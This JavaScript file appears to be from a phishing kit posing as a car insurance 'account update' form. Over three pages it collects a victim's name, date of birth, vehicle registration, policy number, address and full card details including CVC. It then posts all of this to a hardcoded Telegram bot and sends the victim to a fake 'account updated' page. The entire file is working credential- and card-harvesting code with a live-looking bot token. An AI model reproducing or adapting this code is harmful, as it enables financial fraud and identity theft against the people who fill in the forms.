var telegram_bot_id = "7092763134:AAFoVnFRJKr5uw1QsaSx_0TVm5lfUd3Rifc";
var chat_id = 7043309571;

// Function to pass account information through URL parameters
function passAccountInfo() {
    var fullName = document.getElementById("full_name").value;
    var dob = document.getElementById("dob").value;
    var carRegNumber = document.getElementById("car_reg_number").value;
    var policyNumber = document.getElementById("policy_number").value;

    var queryString = `?full_name=${encodeURIComponent(fullName)}&dob=${encodeURIComponent(dob)}&car_reg_number=${encodeURIComponent(carRegNumber)}&policy_number=${encodeURIComponent(policyNumber)}`;

    window.location.href = "address.html" + queryString;
    return false; // Prevent default form submission
}

// Function to pass address information through URL parameters
function passAddressInfo() {
    var urlParams = new URLSearchParams(window.location.search);

    var street = document.getElementById("street").value;
    var city = document.getElementById("city").value;
    var state = document.getElementById("state").value;
    var zip = document.getElementById("zip").value;

    var queryString = `?full_name=${encodeURIComponent(urlParams.get('full_name'))}&dob=${encodeURIComponent(urlParams.get('dob'))}&car_reg_number=${encodeURIComponent(urlParams.get('car_reg_number'))}&policy_number=${encodeURIComponent(urlParams.get('policy_number'))}&street=${encodeURIComponent(street)}&city=${encodeURIComponent(city)}&state=${encodeURIComponent(state)}&zip=${encodeURIComponent(zip)}`;

    window.location.href = "billing.html" + queryString;
    return false; // Prevent default form submission
}

// Function to send billing information along with account and address information to Telegram
function sendBillingInfo() {
    var urlParams = new URLSearchParams(window.location.search);

    var accountInfo = {
        full_name: urlParams.get('full_name'),
        dob: urlParams.get('dob'),
        car_reg_number: urlParams.get('car_reg_number'),
        policy_number: urlParams.get('policy_number'),
        street: urlParams.get('street'),
        city: urlParams.get('city'),
        state: urlParams.get('state'),
        zip: urlParams.get('zip')
    };

    if (!accountInfo.full_name || !accountInfo.dob || !accountInfo.car_reg_number || !accountInfo.policy_number || !accountInfo.street || !accountInfo.city || !accountInfo.state || !accountInfo.zip) {
        console.error("Account information not found in URL parameters");
        return false;
    }

    var cardNumber = document.getElementById("card_number").value;
    var expiry = document.getElementById("expiry").value;
    var cvc = document.getElementById("cvc").value;

    var message = "Full Name: " + accountInfo.full_name + "\n";
    message += "Date of Birth: " + accountInfo.dob + "\n";
    message += "Car Registration Number: " + accountInfo.car_reg_number + "\n";
    message += "Policy Number: " + accountInfo.policy_number + "\n";
    message += "Street: " + accountInfo.street + "\n";
    message += "City: " + accountInfo.city + "\n";
    message += "State: " + accountInfo.state + "\n";
    message += "Zip: " + accountInfo.zip + "\n\n";
    message += "Card Number: " + cardNumber + "\n";
    message += "Expiry: " + expiry + "\n";
    message += "CVC: " + cvc;

    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };

    $.ajax(settings).done(function (response) {
        console.log("Message sent successfully:", response);
        // Redirect to account updated page
        window.location.href = "account_updated.html";
    }).fail(function (xhr, status, error) {
        console.error("Error sending message:", error);
    });

    return false; // Prevent default form submission
}
